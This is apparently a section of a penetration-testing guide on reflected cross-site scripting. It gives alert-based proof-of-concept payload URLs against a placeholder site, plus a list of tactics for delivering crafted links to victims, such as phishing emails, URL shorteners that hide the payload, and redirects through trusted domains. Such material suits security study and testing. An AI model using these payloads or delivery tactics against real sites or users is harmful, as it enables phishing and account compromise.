# Phase 3: Reflected XSS Exploitation

#### Construct Malicious URLs
Build URLs containing XSS payloads:

```
# Basic reflected payload
https://target.com/search?q=<script>alert(document.domain)</script>

# URL-encoded payload
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Event handler in parameter
https://target.com/page?name="><img src=x onerror=alert(1)>

# Fragment-based (for DOM XSS)
https://target.com/page#<script>alert(1)</script>
```

#### Delivery Methods
Techniques for delivering reflected XSS to victims:

```
1. Phishing emails with crafted links
2. Social media message distribution
3. URL shorteners to obscure payload
4. QR codes encoding malicious URLs
5. Redirect chains through trusted domains
```
